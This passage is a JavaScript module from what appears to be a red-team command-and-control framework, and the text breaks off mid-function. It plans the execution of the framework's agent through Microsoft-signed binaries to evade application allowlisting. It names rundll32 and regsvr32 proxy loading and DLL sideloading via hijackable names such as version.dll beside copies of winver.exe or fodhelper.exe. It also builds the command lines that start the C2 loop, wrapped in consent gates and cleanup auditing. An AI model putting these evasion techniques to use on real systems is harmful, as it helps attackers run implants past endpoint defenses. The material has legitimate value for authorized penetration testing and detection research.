// VARVEL — the SIGNED-PROXY EXECUTION tier (the governed answer to THE WALL): a
// nation-tier endpoint runs application allowlisting (WDAC/AppLocker), so the
// unsigned varvel-agent.exe never executes there and PowerShell is Constrained-
// Language + AMSI-watched. The standard nation-grade answer is SIGNED-PROXY
// EXECUTION: run OUR logic inside/through MICROSOFT-SIGNED binaries. This file is
// the PURE governance/planning half — the technique registry, the plan/manifest
// model, and the cleanup-proof state machine. The payload half is the DLL form of
// the native agent (agents/native/proxydll.go, buildmode=c-shared — same wire /
// HMAC / seq core as the exe). The agent-side execution half is the
// ==EXECPROXY-LIB== block (agents/execproxy-host.ps1 / agents/varvel-agent.ps1).
//
// THE SIGNATURE DOCTRINE, enforced in code exactly as in engine/persist.mjs:
//
//   A PLANT THAT CANNOT PROVE ITS OWN REMOVAL NEVER HAPPENS.
//
// Mechanically: run() snapshots the PRE-PLANT state of every file it would write
// FIRST (never write what you cannot put back), REFUSES to clobber a foreign file
// silently (a target path that already holds different bytes is a loud refusal,
// not an overwrite), PROVES every plant by re-read (sha256), and remove() VERIFIES
// ABSENCE by re-read (a removal that cannot verify is a LOUD, escalated failure —
// assessExecProxyClean refuses 'clean' while unverified plants exist).
//
// CLEANUP DOCTRINE — ABSOLUTE: a host binary is NEVER modified in place and a DLL
// is NEVER planted beside the ORIGINAL in a system directory. Sideload plants are
// COPIES ONLY, into the governed sandbox (the agent's own dir — the same blast
// radius as its shell kind): copy the signed host exe into the sandbox, write our
// DLL beside it under the hijacked name, launch the COPY.
//
// TECHNIQUE REGISTRY (stage 1):
//   rundll32-class  — `rundll32.exe <dll>,<Export> [args]`: the signed host loads
//                     our DLL directly. The DLL exports VarvelStatus (returns
//                     immediately — recon/proof) and VarvelRun/VarvelRunR (the
//                     blocking agent loop). HONEST LIMIT: rundll32-class execution
//                     is LOLBin-detectable behavior (command line + image load) —
//                     the detection oracle grades it per engagement, never claimed.
//   regsvr32-class  — `regsvr32.exe /s <dll>` calls our DllRegisterServer export
//                     (returns S_OK, NO registration side effects by design).
//                     DOCUMENTED LIMITATION (measured 2026-08-18, Win11 24H2): the
//                     regsvr32 process does NOT terminate cleanly afterwards — the
//                     Go runtime cannot be unloaded (DLL_PROCESS_DETACH) and the
//                     host lingers. Load-only proof; rundll32-class is the clean leg.
//   sideload-class  — plant our DLL under a name a chosen signed host loads from
//                     its OWN directory (search order): copy host + write DLL +
//                     launch the copy, all inside the sandbox. HONEST LIMIT: whether
//                     a given host actually loads the planted name depends on the
//                     host and the target build — MEASURED per engagement (edrview
//                     pairing + the status marker), never claimed.
//
// Governance (three seams, all fail-closed — mirrors engine/evasion.mjs /
// engine/persist.mjs):
//   1. ENGAGEMENT GATE — settings key 'exec.proxy' (default OFF). The channel
//      refuses to queue execproxy-* unless the engagement explicitly enabled it;
//      the agent must ALSO have been launched with its own flag (-AllowProxyExec /
//      --proxy 1). Refusals are loud and audited (task.refused), never silent drops.
//   2. SPEC GATE — the task data must parse: known kind, known technique, allow-
//      listed export, safe name handle; remove requires an explicit scope. Refused
//      BEFORE queueing.
//   3. AUDIT — a queued task emits 'execproxy.task' with the sha256 of the
//      normalized SPEC. Result intake emits 'execproxy.ran' / 'execproxy.removed' /
//      'execproxy.remove-failed' (escalated) / 'execproxy.status' carrying the
//      sha256 of EVERY file planted or executed plus the verification booleans —
//      the accountability trail (what ran where, provably, and that it was
//      provably taken back).

import { createHash } from 'node:crypto';
import { Settings } from './settings.mjs';

const sha256 = (buf) => createHash('sha256').update(buf).digest('hex');

export const EXECPROXY_KIND_RUN = 'execproxy-run';
export const EXECPROXY_KIND_REMOVE = 'execproxy-remove';
export const EXECPROXY_KIND_STATUS = 'execproxy-status';
export const EXECPROXY_KINDS = new Set([EXECPROXY_KIND_RUN, EXECPROXY_KIND_REMOVE, EXECPROXY_KIND_STATUS]);

export const EXECPROXY_TECHNIQUES = ['rundll32', 'regsvr32', 'sideload'];

// The allow-listed DLL exports a spec may name (stage 1). VarvelStatus returns
// immediately (the recon/proof leg — NEVER starts the C2 loop); VarvelRun is the
// canonical blocking C ABI; VarvelRunR is its rundll32-callable alias.
export const EXECPROXY_EXPORTS = ['VarvelStatus', 'VarvelRun', 'VarvelRunR'];

// Stage-1 hijackable-name allowlist for the sideload 'as' field — the well-known
// search-order names from public research. Strict on purpose: the spec gate means
// something.
export const EXECPROXY_HIJACK_NAMES = ['version.dll', 'winmm.dll', 'dbghelp.dll', 'dbgcore.dll', 'cryptsp.dll', 'profapi.dll', 'apphelp.dll'];

// Candidate signed hosts for sideload + the discovery ranker (RECON ONLY — the
// discovery leg never auto-plants). These are PUBLIC-RESEARCH candidates; whether a
// specific host on a specific target build actually loads the planted name is a
// MEASURED fact (status marker + edrview verdict), never a claim.
export const EXECPROXY_HOST_CANDIDATES = [
  { host: '%SystemRoot%\\System32\\winver.exe', names: ['version.dll'], note: 'classic search-order candidate (public research)' },
  { host: '%SystemRoot%\\System32\\Sysprep\\sysprep.exe', names: ['cryptsp.dll', 'dbgcore.dll'], note: 'classic search-order candidate (public research)' },
  { host: '%SystemRoot%\\System32\\ComputerDefaults.exe', names: ['profapi.dll', 'apphelp.dll'], note: 'classic search-order candidate (public research)' },
  { host: '%SystemRoot%\\System32\\fodhelper.exe', names: ['apphelp.dll'], note: 'classic search-order candidate (public research)' },
];

export const EXECPROXY_NAME_RE = /^[A-Za-z0-9][A-Za-z0-9_.-]{0,39}$/;

export function execProxyTag(seed) {
  return 'VARVEL-' + sha256(String(seed ?? '')).slice(0, 8);
}

// The technique registry. plan() is PURE: it computes the argv the agent will run
// and the file set it will plant — the manifest records exactly this, and the
// audit hash pins it. Execution happens ONLY agent-side, never from Node.
export const EXECPROXY_REGISTRY = {
  rundll32: {
    technique: 'rundll32',
    signedHost: '%SystemRoot%\\System32\\rundll32.exe', // resolved agent-side; signature evidenced
    plants: false, // the DLL is the pre-staged payload itself — nothing is copied
    summary: 'signed-host direct load: rundll32.exe <dll>,<Export> [args]. LOLBin-detectable behavior — the oracle grades it.',
    // QUOTING DOCTRINE (measured 2026-08-18, Win11 24H2, System32\rundll32.exe):
    // rundll32 re-parses its own command line and DECLINES THE LOAD when the
    // "<dll>,<Export>" token is QUOTED (the leading quote becomes part of the DLL
    // name on its parse path). The entry spec and the arg tail ride as separate
    // UNQUOTED tokens — the agent-side host refuses space-containing paths loudly.
    plan({ dll, export: exp, args }) {
      const argv = ['rundll32.exe', `${dll},${exp}`];
      if (args) argv.push(String(args));
      return { argv, files: [{ role: 'payload', path: dll }], notes: 'arg tail is a SEPARATE argv token (rundll32 quoting doctrine)' };
    },
  },
  regsvr32: {
    technique: 'regsvr32',
    signedHost: '%SystemRoot%\\System32\\regsvr32.exe',
    plants: false,
    supported: 'load-only', // the host may NOT exit cleanly (Go runtime cannot unload) — documented limit
    summary: 'regsvr32.exe /s <dll> calls DllRegisterServer (S_OK, no registration side effects). Load-only proof: the host does not terminate cleanly (Go c-shared cannot unload) — rundll32-class is the clean leg.',
    plan({ dll }) {
      return { argv: ['regsvr32.exe', '/s', dll], files: [{ role: 'payload', path: dll }], notes: 'host may linger after the call (documented limitation); export is implicitly DllRegisterServer' };
    },
  },
  sideload: {
    technique: 'sideload',
    signedHost: null, // operator-chosen per spec.host (discovery ranks candidates)
    plants: true, // host COPY + DLL-as-name copy, sandbox-confined — NEVER in place, NEVER beside the original
    summary: 'search-order plant: copy the signed host into the sandbox, write our DLL beside it under the hijacked name, launch the copy.',
    plan({ dll, host, as, args, plantDir }) {
      const hostBase = String(host).split(/[\\/]/).pop();
      const files = [
        { role: 'host-copy', path: plantDir + '\\' + hostBase, copyFrom: host },
        { role: 'dll-as', path: plantDir + '\\' + as, copyFrom: dll },
        { role: 'payload', path: dll },
      ];
      const argv = [plantDir + '\\' + hostBase];
      if (args) argv.push(String(args));
      return { argv, files, notes: 'copies only, sandbox-confined; the original host is never touched' };
    },
  },
};

// Canonical plant dir for a sideload unit (the name handle makes it deterministic —
// the same name re-plants the same dir, idempotently).
export function execProxyPlantDir(sandbox, name) {
  return String(sandbox).replace(/[\\/]+$/, '') + '\\execproxy-' + name;
}

// The sha256 of the normalized spec — pinned into 'execproxy.task' at queue time
// (what was ordered, provably).
export function execProxySpecSha256(spec) {
  return sha256(JSON.stringify({
    kind: spec.kind, technique: spec.technique || null, name: spec.name || null,
    export: spec.export || null, all: spec.all === true,
    // paths are normalized by shape only (case) — the CONTENT hash is evidenced
    // agent-side at run time and lands in the intake events.
    dll: spec.dll ? String(spec.dll).toLowerCase() : null,
    host: spec.host ? String(spec.host).toLowerCase() : null,
    as: spec.as ? String(spec.as).toLowerCase() : null,
  }));
}

const ABS_WIN_PATH_RE = /^([A-Za-z]:\\|\\\\|%[A-Za-z]+%\\)/; // drive / UNC / %ENV%-rooted

function validFilePath(p, what, suffixRe) {
  const s = String(p || '').trim();
  if (!s) throw new TypeError(what + ' is required (an absolute path on the range host)');
  if (s.length > 260) throw new RangeError(what + ' exceeds the 260-char path cap');
  if (!ABS_WIN_PATH_RE.test(s)) throw new TypeError(what + ' must be an ABSOLUTE Windows path (drive, UNC, or %ENV%-rooted): ' + JSON.stringify(s.slice(0, 60)));
  if (s.includes('..')) throw new TypeError(what + ' must not contain ".." — the plant set stays sandbox-confined');
  if (suffixRe && !suffixRe.test(s)) throw new TypeError(what + ' must end in ' + suffixRe + ': ' + JSON.stringify(s.slice(-40)));
  return s;
}

// Parse + validate an execproxy task-data string for the given kind. THROWS
// (TypeError/RangeError) with a loud, operator-readable reason. Pure: no I/O, no
// settings — the same parse runs server-side (pre-queue refusal) and agent-side
// (pre-execution refusal).
export function parseExecProxySpec(kind, data) {
  kind = String(kind || '');
  if (!EXECPROXY_KINDS.has(kind)) throw new TypeError('execproxy: unknown kind ' + JSON.stringify(kind) + ' (want one of ' + [...EXECPROXY_KINDS].join(', ') + ')');
  const raw = String(data ?? '').trim();
  const nameFrom = (spec, k) => {
    if (spec.name === undefined || spec.name === null || String(spec.name).trim() === '') return null;
    const name = String(spec.name).trim();
    if (!EXECPROXY_NAME_RE.test(name)) throw new TypeError(k + ': name ' + JSON.stringify(name) + ' is not a safe plant handle (want ' + EXECPROXY_NAME_RE + ' — it becomes the manifest key and the sideload plant-dir suffix)');
    return name;
  };
  const parseObj = (k, want) => {
    let spec;
    try { spec = JSON.parse(raw); } catch {
      throw new TypeError(k + ': task data is not valid JSON (want ' + want + ')');
    }
    if (!spec || typeof spec !== 'object' || Array.isArray(spec)) throw new TypeError(k + ': task data must be a JSON object');
    return spec;
  };
  if (kind === EXECPROXY_KIND_STATUS) {
    if (!raw || raw === '{}') return { kind, technique: null, name: null }; // the full sweep
    const spec = parseObj(kind, '{"name":"VARVEL-xxxxxxxx"}');
    if (spec.technique !== undefined && !EXECPROXY_TECHNIQUES.includes(String(spec.technique))) {
      throw new TypeError(kind + ': unknown technique ' + JSON.stringify(spec.technique) + ' (stage 1 ships ' + EXECPROXY_TECHNIQUES.join(', ') + ' only)');
    }
    return { kind, technique: spec.technique ? String(spec.technique).toLowerCase() : null, name: nameFrom(spec, kind) };
  }
  if (kind === EXECPROXY_KIND_REMOVE) {
    if (!raw || raw === '{}') throw new TypeError('execproxy-remove needs an explicit scope: {"name":"..."} or {"all":true} — removal is never ambiguous');
    const spec = parseObj(kind, '{"name":"..."} or {"all":true}');
    const all = spec.all === true;
    const name = nameFrom(spec, kind);
    if (all && name) throw new TypeError('execproxy-remove: give name OR all:true, not both — the removal scope must be unambiguous');
    if (!all && !name) throw new TypeError('execproxy-remove needs an explicit scope: {"name":"..."} or {"all":true}');
    return { kind, technique: null, name, all };
  }
  // execproxy-run
  const spec = parseObj(kind, '{"technique":"rundll32","dll":"C:\\\\...\\\\varvel-agent.dll","export":"VarvelStatus","args":"..."}');
  const technique = String(spec.technique || '').toLowerCase().trim();
  if (!EXECPROXY_TECHNIQUES.includes(technique)) {
    throw new TypeError(kind + ': unknown technique ' + JSON.stringify(spec.technique) + ' (stage 1 ships ' + EXECPROXY_TECHNIQUES.join(', ') + ' — rundll32-class direct load, regsvr32-class load-only, sideload-class search-order plant)');
  }
  const dll = validFilePath(spec.dll, kind + ': dll', /\.dll$/i);
  const out = { kind, technique, dll, name: nameFrom(spec, kind), args: spec.args == null ? '' : String(spec.args).slice(0, 400) };
  if (technique === 'rundll32') {
    const exp = String(spec.export || '').trim();
    if (!EXECPROXY_EXPORTS.includes(exp)) throw new TypeError(kind + ': export must be one of ' + EXECPROXY_EXPORTS.join(', ') + ' (the DLL form\'s allow-listed C ABI — VarvelStatus returns immediately and is the proof leg; VarvelRun/VarvelRunR start the blocking agent loop)');
    out.export = exp;
  }
  if (technique === 'sideload') {
    out.host = validFilePath(spec.host, kind + ': host', /\.exe$/i);
    const as = String(spec.as || '').toLowerCase().trim();
    if (!EXECPROXY_HIJACK_NAMES.includes(as)) throw new TypeError(kind + ': as must be one of ' + EXECPROXY_HIJACK_NAMES.join(', ') + ' (stage-1 search-order allowlist)');
    out.as = as;
  }
  return out;
}

// The engagement gate. Returns { ok: true } or { ok: false, reason } — fail-CLOSED
// on any settings-layer error (a gate that cannot read its setting does not run).
export function execProxyGate(engagement) {
  let on = false;
  try { on = Settings.for(engagement || 'default').get('exec.proxy') === true; } catch { on = false; }
  if (!on) {
    return {
      ok: false,
      reason: "engagement setting 'exec.proxy' is OFF — the signed-proxy execution tier is disabled. "
        + "An operator must explicitly enable it for engagement '" + (engagement || 'default') + "' "
        + "(POST /api/settings {key:'exec.proxy', value:true}) before execproxy tasks will queue, and the agent must "
        + "have been launched with its own proxy-exec flag. Nothing planted, nothing executed.",
    };
  }
  return { ok: true };
}

// ——— ExecProxyStore ———
// The PURE state-machine twin of the agent-side machinery (the ==EXECPROXY-LIB==
// block does the identical dance against the real filesystem / Process APIs), run
// over an INJECTED backend so the cleanup-proof contract is pinned hermetically:
// pre-plant snapshot FIRST, foreign-clobber refusal, plant verified by sha256
// re-read, removal verified by re-read, verify-failure LOUD.
//
// backend = {
//   probe(path) -> { present:boolean, sha256:string|null }   // re-read + hash
//   plant(path, copyFrom) -> void                            // copy copyFrom -> path
//   remove(path) -> void                                     // delete ONE file
//   removeDir(path) -> void                                  // delete the (empty) plant dir
//   run(argv) -> { code:number, output:string }              // exec the signed host
// }
// A test backend is a Map; the real backend is Windows itself, driven by the PS twin.
export class ExecProxyStore {
  constructor({ backend, name, sandbox, now } = {}) {
    if (!backend || typeof backend.probe !== 'function' || typeof backend.plant !== 'function' || typeof backend.remove !== 'function' || typeof backend.run !== 'function') {
      throw new TypeError('ExecProxyStore needs an injected backend { probe, plant, remove, run } — the real filesystem/processes are NEVER touched from Node');
    }
    if (!name || !EXECPROXY_NAME_RE.test(String(name))) throw new TypeError('ExecProxyStore needs a valid name handle (the manifest key / plant-dir suffix)');
    this.backend = backend;
    this.name = String(name);
    this.sandbox = String(sandbox || '%SANDBOX%');
    this._now = typeof now === 'function' ? now : () => new Date().toISOString();
    this.manifest = { version: 1, name: this.name, createdAt: this._now(), entries: {} };
  }

  _evidence(technique) {
    return {
      state: 'failed', technique,
      dllSha256: null, hostSha256: null, command: null, exitCode: null,
      files: [], // { role, path, sha256, present, planted, removalVerified }
      installVerified: null, removalVerified: null,
      note: null, error: null,
    };
  }

  // run(): pre-plant snapshot FIRST (the DLL payload must exist and hash; every
  // plant target must be absent or byte-identical — a foreign occupant is a loud
  // refusal, never a silent clobber); plants verified by sha256 re-read; then the
  // signed host executes. Returns the evidence object (never throws on a governed
  // refusal; backend faults land as state 'failed' with the error).
  run(spec) {
    const technique = String(spec.technique || '');
    const reg = EXECPROXY_REGISTRY[technique];
    if (!reg) throw new TypeError('execproxy-run: unknown technique ' + JSON.stringify(technique));
    const ev = this._evidence(technique);
    const plan = reg.plan({ ...spec, plantDir: execProxyPlantDir(this.sandbox, this.name) });
    ev.command = plan.argv.join(' ');
    ev.note = reg.summary;

    // 1. THE PAYLOAD: must exist and hash — the audit hash of every executed file
    //    is the accountability trail. No payload, no run.
    let dllProbe;
    try { dllProbe = this.backend.probe(spec.dll); } catch (e) {
      ev.error = 'payload probe failed: ' + ((e && e.message) || e) + ' — nothing executed';
      return ev;
    }
    if (!dllProbe || dllProbe.present !== true || !dllProbe.sha256) {
      ev.error = 'payload DLL not found or unhashable at ' + spec.dll + ' — stage it into the governed sandbox first (nothing executed)';
      return ev;
    }
    ev.dllSha256 = dllProbe.sha256;

    // 2. SIDELOAD PLANTS: snapshot each target; refuse foreign occupants.
    if (reg.plants) {
      const hostProbe = safeProbe(this.backend, spec.host);
      if (!hostProbe || hostProbe.present !== true || !hostProbe.sha256) {
        ev.error = 'sideload host not found or unhashable at ' + spec.host + ' — discovery (tools/execproxy.mjs) ranks candidates; nothing planted';
        return ev;
      }
      ev.hostSha256 = hostProbe.sha256;
      for (const f of plan.files) {
        if (!f.copyFrom) continue;
        const pre = safeProbe(this.backend, f.path);
        const rec = { role: f.role, path: f.path, sha256: null, present: false, planted: false, preExisted: !!(pre && pre.present), removalVerified: null };
        if (pre && pre.present) {
          const src = f.role === 'host-copy' ? ev.hostSha256 : ev.dllSha256;
          if (pre.sha256 !== src) {
            ev.state = 'refused-clobber';
            rec.present = true; rec.sha256 = pre.sha256;
            ev.files.push(rec);
            ev.error = 'plant target already holds FOREIGN bytes (sha256 ' + String(pre.sha256).slice(0, 12) + '…): ' + f.path + ' — REFUSED to clobber it silently. execproxy-remove this name first, or pick another name handle.';
            return ev;
          }
          // Idempotent: already planted by us, intact — keep it.
          rec.present = true; rec.sha256 = pre.sha256; rec.planted = true;
          ev.files.push(rec);
          continue;
        }
        try { this.backend.plant(f.path, f.copyFrom); } catch (e) {
          ev.error = 'plant write failed for ' + f.path + ': ' + ((e && e.message) || e) + ' — nothing claimed';
          ev.files.push(rec);
          return ev;
        }
        const post = safeProbe(this.backend, f.path);
        const want = f.role === 'host-copy' ? ev.hostSha256 : ev.dllSha256;
        if (!post || post.present !== true || post.sha256 !== want) {
          ev.error = 'plant write did NOT verify (sha256 re-read mismatch) for ' + f.path + ' — the plant is UNVERIFIED, reported honestly; remove will still take this entry back';
          rec.present = !!(post && post.present); rec.sha256 = post ? post.sha256 : null;
          ev.files.push(rec);
          this._recordEntry(ev, plan, 'failed');
          return ev;
        }
        rec.present = true; rec.sha256 = post.sha256; rec.planted = true;
        ev.files.push(rec);
      }
      ev.installVerified = ev.files.every((f) => f.planted);
    } else {
      ev.files.push({ role: 'payload', path: spec.dll, sha256: ev.dllSha256, present: true, planted: false, preExisted: true, removalVerified: null });
      ev.installVerified = null; // nothing to install
    }

    // 3. EXECUTE through the signed host.
    let r;
    try { r = this.backend.run(plan.argv); } catch (e) {
      ev.error = 'signed-host launch failed: ' + ((e && e.message) || e);
      this._recordEntry(ev, plan, 'failed');
      return ev;
    }
    r = r || {};
    ev.exitCode = typeof r.code === 'number' ? r.code : null;
    ev.outputTail = String(r.output || '').slice(-800);
    ev.state = 'ran';
    if (reg.supported === 'load-only') {
      ev.note += ' NOTE: regsvr32-class is load-only — the host process may linger after the call (the Go runtime cannot unload); removal is file-level, the lingering host exits with its own session.';
    }
    this._recordEntry(ev, plan, 'ran');
    return ev;
  }

  _recordEntry(ev, plan, state) {
    const prev = this.manifest.entries[this.name];
    this.manifest.entries[this.name] = {
      name: this.name, technique: ev.technique, command: ev.command,
      dllSha256: ev.dllSha256, hostSha256: ev.hostSha256,
      files: ev.files.map((f) => ({ role: f.role, path: f.path, sha256: f.sha256, planted: f.planted === true })),
      state,
      ranAt: (prev && prev.ranAt) || this._now(),
      exitCode: ev.exitCode,
      removedAt: null, removalVerified: null,
    };
  }

  // status(): LIVE re-read, measured now — never remembered. Per file: 'planted'
  // (present + hash intact), 'tampered' (present, hash changed under us),
  // 'removed' (verified absent after remove), 'missing' (manifest says planted but
  // the file is gone — out-of-band removal, an honest loose end), 'absent'.
  status() {
    const ev = this._evidence(this.manifest.entries[this.name] ? this.manifest.entries[this.name].technique : null);
    const entry = this.manifest.entries[this.name];
    if (!entry) {
      ev.state = 'absent';
      ev.note = 'no manifest entry for this name handle — nothing was ever run under it (measured now)';
      return ev;
    }
    ev.technique = entry.technique; ev.command = entry.command;
    ev.dllSha256 = entry.dllSha256; ev.hostSha256 = entry.hostSha256;
    let anyPresent = false;
    let anyTampered = false;
    let anyUnverifiable = false;
    for (const f of entry.files) {
      const cur = safeProbe(this.backend, f.path);
      const rec = { role: f.role, path: f.path, sha256: cur ? cur.sha256 : null, present: !!(cur && cur.present), planted: f.planted === true, removalVerified: null, state: null };
      if (cur === null) {
        rec.state = 'unknown'; anyUnverifiable = true;
      } else if (cur.present && f.sha256 && cur.sha256 === f.sha256) {
        rec.state = f.planted ? 'planted' : 'present';
        if (f.planted) anyPresent = true;
      } else if (cur.present) {
        rec.state = 'tampered'; anyTampered = true; anyPresent = true;
      } else {
        rec.state = f.planted ? (entry.removalVerified === true ? 'removed' : 'missing') : 'absent';
        if (rec.state === 'removed') rec.removalVerified = true;
      }
      ev.files.push(rec);
    }
    if (anyTampered) { ev.state = 'tampered'; ev.note = 'a planted file\'s bytes CHANGED under us — reported honestly; removal will refuse to delete foreign bytes'; }
    else if (anyPresent) { ev.state = 'planted'; ev.note = 'plant files present and hash-intact at live re-read'; }
    else if (anyUnverifiable) { ev.state = 'unknown'; ev.note = 'a probe failed — never assume absence'; }
    else if (entry.removalVerified === true) { ev.state = 'removed'; ev.removalVerified = true; ev.note = 'verified absent (removal was proven at ' + (entry.removedAt || 'remove time') + '; still absent at this live re-read)'; }
    else { ev.state = entry.state === 'ran' ? 'missing' : 'absent'; ev.note = ev.state === 'missing' ? 'manifest says planted but the files are GONE — removed outside a verified remove op (out-of-band). Absence is measured now; the removal itself was never channel-verified.' : 'nothing planted (manifest state ' + entry.state + ')'; }
    return ev;
  }

  // remove(): execute, then VERIFY. Only files whose live hash STILL matches what we
  // planted are deleted (we never delete foreign bytes — a tampered plant is a loud
  // 'refused-foreign'). A removal whose re-read still shows a planted file present
  // is 'removal-failed' — LOUD, escalated channel-side as execproxy.remove-failed,
  // and the engagement cannot be called clean while it stands.
  remove() {
    const ev = this._evidence(this.manifest.entries[this.name] ? this.manifest.entries[this.name].technique : null);
    const entry = this.manifest.entries[this.name];
    if (!entry) {
      ev.state = 'removed'; ev.removalVerified = true;
      ev.note = 'nothing was ever run under this name handle — verified clean (no manifest entry)';
      return ev;
    }
    ev.technique = entry.technique; ev.command = entry.command;
    ev.dllSha256 = entry.dllSha256; ev.hostSha256 = entry.hostSha256;
    const planted = entry.files.filter((f) => f.planted === true);
    if (!planted.length) {
      ev.state = 'removed'; ev.removalVerified = true;
      ev.note = entry.technique === 'sideload'
        ? 'no plant files recorded — the plant dir is verified clean'
        : entry.technique + '-class plants nothing (the payload DLL is the pre-staged input artifact — it is NOT deleted by remove; it was never a plant)';
      entry.state = 'removed'; entry.removalVerified = true; entry.removedAt = this._now();
      return ev;
    }
    for (const f of planted) {
      const rec = { role: f.role, path: f.path, sha256: null, present: false, planted: true, removalVerified: null };
      const pre = safeProbe(this.backend, f.path);
      if (pre === null) {
        rec.removalVerified = false; ev.files.push(rec);
        ev.state = 'removal-failed'; entry.state = 'removal-failed'; entry.removalVerified = false;
        ev.error = 'pre-remove probe failed for ' + f.path + ' — removal UNVERIFIED (LOUD; escalate)';
        return ev;
      }
      if (pre.present && pre.sha256 !== f.sha256) {
        rec.present = true; rec.sha256 = pre.sha256; ev.files.push(rec);
        ev.state = 'refused-foreign';
        ev.error = 'plant file now holds FOREIGN bytes (hash changed since plant): ' + f.path + ' — REFUSED to delete what we did not write (LOUD; escalate to the operator)';
        return ev;
      }
      if (pre.present) {
        try {
          this.backend.remove(f.path);
        } catch (e) {
          rec.present = true; ev.files.push(rec);
          ev.state = 'removal-failed'; entry.state = 'removal-failed'; entry.removalVerified = false;
          ev.error = 'remove failed for ' + f.path + ': ' + ((e && e.message) || e) + ' — removal UNVERIFIED (LOUD; escalate)';
          return ev;
        }
      }
      const post = safeProbe(this.backend, f.path);
      rec.removalVerified = !!(post && post.present === false);
      rec.present = !!(post && post.present);
      if (!rec.removalVerified) {
        ev.files.push(rec);
        ev.state = 'removal-failed'; entry.state = 'removal-failed'; entry.removalVerified = false;
        ev.error = 'remove executed but ' + f.path + ' is STILL PRESENT on re-read — CLEANUP-PROOF FAILED (loud, escalated to the operator; the engagement cannot be called clean)';
        return ev;
      }
      ev.files.push(rec);
    }
    // The plant dir itself goes last (only once every file is verified gone).
    if (typeof this.backend.removeDir === 'function') {
      try { this.backend.removeDir(execProxyPlantDir(this.sandbox, this.name)); } catch { /* a lingering empty dir is reported by status, never hidden */ }
    }
    ev.state = 'removed'; ev.removalVerified = true;
    ev.note = 'every planted file was deleted and re-read absent — the plant provably holds nothing of ours';
    entry.state = 'removed'; entry.removalVerified = true; entry.removedAt = this._now();
    return ev;
  }

  // audit(): the engagement sweep over THIS store's manifest. clean === true ONLY
  // with zero open entries (still-planted / tampered / removal-unverified) — an
  // engagement with unverified plants is never clean.
  audit() {
    const entry = this.manifest.entries[this.name];
    if (!entry) {
      return { state: 'clean', clean: true, entries: [], open: [], note: 'nothing was ever run under this name handle (empty manifest) — clean' };
    }
    const st = this.status();
    const open = [];
    const rec = { name: this.name, technique: entry.technique, command: entry.command, state: st.state, removalVerified: entry.removalVerified === true, ranAt: entry.ranAt, removedAt: entry.removedAt || null };
    const closed = entry.removalVerified === true && st.files.every((f) => !f.planted || !f.present);
    if (!closed) {
      rec.removalVerified = false;
      open.push(rec);
    }
    return {
      state: open.length === 0 ? 'clean' : 'unclean',
      clean: open.length === 0,
      entries: [rec], open,
      note: open.length === 0
        ? 'the run under this name handle is verified removed — clean'
        : 'plant files still present or removal-unverified under this name handle — the engagement CANNOT be called clean; run execproxy-remove and re-audit',
    };
  }
}

function safeProbe(backend, path) {
  try { return backend.probe(path) || { present: false, sha256: null }; } catch { return null; }
}

// Parse an agent execproxy result body into the channel-side audit event, or null
// when the body is not parseable execproxy evidence JSON (a loud-text refusal,
// truncation, or a foreign body — no event is ever fabricated from unverifiable
// data; the ledger preview already carries those). Used by CallbackChannel._intakeResult.
export function parseExecProxyEvidence(body) {
  let p;
  try { p = JSON.parse(String(body || '')); } catch { return null; }
  if (!p || typeof p !== 'object' || typeof p.op !== 'string') return null;
  if (p.op === 'status' || p.op === 'audit') {
    if (typeof p.clean !== 'boolean' || !Array.isArray(p.entries)) return null;
    return {
      event: 'execproxy.status',
      fields: {
        op: 'status', state: String(p.state || (p.clean ? 'clean' : 'unclean')), clean: p.clean, pid: p.pid ?? null,
        entries: p.entries.filter((e) => e && typeof e === 'object').map((e) => ({
          name: String(e.name || ''), technique: e.technique || null, state: String(e.state || 'unknown'), removalVerified: e.removalVerified === true,
        })),
        open: Array.isArray(p.open) ? p.open.filter((e) => e && typeof e === 'object').map((e) => ({ name: String(e.name || ''), technique: e.technique || null, state: String(e.state || 'unknown') })) : [],
      },
    };
  }
  const event = p.op === 'run' ? 'execproxy.ran' : p.op === 'remove' ? null : null;
  if (!p.names || typeof p.names !== 'object') return null;
  const names = {};
  let anyRemovalFailed = false;
  for (const [name, ev] of Object.entries(p.names)) {
    if (!ev || typeof ev !== 'object') continue;
    const state = String(ev.state || 'unknown');
    if (state === 'removal-failed' || state === 'refused-foreign') anyRemovalFailed = true;
    names[name] = {
      state,
      technique: ev.technique || null,
      command: ev.command || null,
      dllSha256: ev.dllSha256 || null,
      hostSha256: ev.hostSha256 || null,
      hostSigStatus: ev.hostSigStatus || null,
      hostSigner: ev.hostSigner || null,
      exitCode: typeof ev.exitCode === 'number' ? ev.exitCode : null,
      markerVerified: ev.markerVerified === true,
      stillRunning: ev.stillRunning === true,
      installVerified: ev.installVerified === true,
      removalVerified: ev.removalVerified === true,
      files: Array.isArray(ev.files) ? ev.files.filter((f) => f && typeof f === 'object').map((f) => ({
        role: f.role || null, path: f.path || null, sha256: f.sha256 || null, present: f.present === true, planted: f.planted === true, removalVerified: f.removalVerified === true,
      })) : [],
    };
  }
  if (Object.keys(names).length === 0) return null; // NO EVIDENCE, NO EVENT
  const removeEvent = p.op === 'remove' ? (anyRemovalFailed ? 'execproxy.remove-failed' : 'execproxy.removed') : null;
  const finalEvent = event || removeEvent;
  if (!finalEvent) return null;
  return {
    event: finalEvent,
    fields: {
      op: p.op, state: String(p.state || 'unknown'), pid: p.pid ?? null, names,
      // THE ESCALATION: a removal that could not verify is never buried — the event
      // type itself flips to execproxy.remove-failed and carries escalated:true.
      escalated: finalEvent === 'execproxy.remove-failed',
    },
  };
}

// The engagement-end sweep, computed over the channel's audit event stream: an
// engagement is 'clean' ONLY when every execproxy run (per agent + name handle) was
// later closed by a verified removal (execproxy.removed with removalVerified, or an
// execproxy.status sweep reporting clean). Anything else — still planted,
// removal-failed, or simply never revisited — keeps the engagement UNCLEAN.
// Pure: pass the collected onEvent objects in order.
export function assessExecProxyClean(events) {
  const open = new Map(); // agentId|name -> { agentId, name, technique, escalated }
  const closed = [];
  const key = (agentId, name) => String(agentId) + '|' + String(name || '');
  for (const e of events || []) {
    if (!e || typeof e !== 'object') continue;
    if (e.type === 'execproxy.ran' && e.names) {
      for (const [n, t] of Object.entries(e.names)) {
        if (t && t.state === 'ran' && Array.isArray(t.files) && t.files.some((f) => f.planted === true)) {
          open.set(key(e.agentId, n), { agentId: e.agentId, name: n, technique: t.technique || null, escalated: false });
        }
        // rundll32/regsvr32 runs plant NOTHING — nothing to keep open (the payload
        // DLL is the operator-staged input artifact, never a plant).
      }
    } else if ((e.type === 'execproxy.removed' || e.type === 'execproxy.remove-failed') && e.names) {
      for (const [n, t] of Object.entries(e.names)) {
        if (!t) continue;
        const k = key(e.agentId, n);
